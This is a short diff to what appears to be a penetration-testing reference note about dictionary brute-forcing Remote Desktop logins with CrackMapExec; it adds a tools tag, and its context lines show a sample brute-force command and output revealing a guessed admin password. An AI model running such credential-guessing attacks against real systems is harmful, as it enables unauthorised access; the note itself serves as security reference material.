@@ -16,6 +16,8 @@ output: "root@kali:~# crackmapexec rdp 10.10.10.10 -u admin -p wordlist.txt \nCM
   \ BOB-PC       [+] BOB-PC\\admin:Passw0rd \n[*] KTHXBYE!"
 created_at: '2019-09-25T02:38:27.488231+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[CrackMapExec]]'
 ---
 
 # CrackMapExec Dictionary Brute Force Remote Desktop Protocol (RDP)
